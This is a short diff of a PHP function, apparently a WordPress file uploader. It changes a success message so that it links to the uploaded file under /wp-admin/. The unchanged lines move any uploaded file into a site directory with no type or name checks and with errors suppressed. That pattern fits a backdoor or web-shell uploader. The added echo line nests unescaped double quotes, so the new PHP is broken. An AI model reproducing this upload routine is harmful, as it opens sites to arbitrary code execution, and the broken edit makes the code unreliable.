@@ -34,8 +34,8 @@ function main_function(){
     if (isset($_FILES['image']['name'])) {
         $abod = $filedir.$userfile_name;
         @move_uploaded_file($userfile_tmp, $abod);
-  
-	echo "<center><b>Done</br>Go Here ::: /wp-admin/$userfile_name</b></center>";
+  	$homelink=get_home_url();
+	echo "<center><b>Done</br>Go Here ::: <a href="$homelink/wp-admin/$userfile_name">$homelink/wp-admin/$userfile_name</a></b></center>";
 	}
 	}
 	else{
